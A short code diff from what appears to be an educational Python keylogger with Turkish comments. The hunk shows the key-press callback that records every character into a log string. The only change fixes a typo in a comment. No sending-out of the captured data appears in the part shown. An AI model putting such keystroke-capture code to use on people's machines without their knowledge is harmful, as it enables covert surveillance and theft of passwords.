@@ -8,7 +8,7 @@ def callback_function(key):
     try:
         log += str(key.char) #key.char degeri bize direkt olarak karakteri verir
     except AttributeError:
-        if key == key.space:#bu kontrolun sebebi ozel klavye tuslari girilince(space, esc vb.) script'in cokmesini ve girilen bu ozel karakterleri algilamasini saglamaktir.
+        if key == key.space:#bu kontrolun sebebi ozel klavye tuslari girilince(space, esc vb.) script'in cokmemesini ve girilen bu ozel karakterleri algilamasini saglamaktir.
             log += " "
         else:
             log += str(key)#key.char yapilinca direkt olarak karakteri verir ve enter gibi tab gibi karakterlerde bu durum hataya yol acar
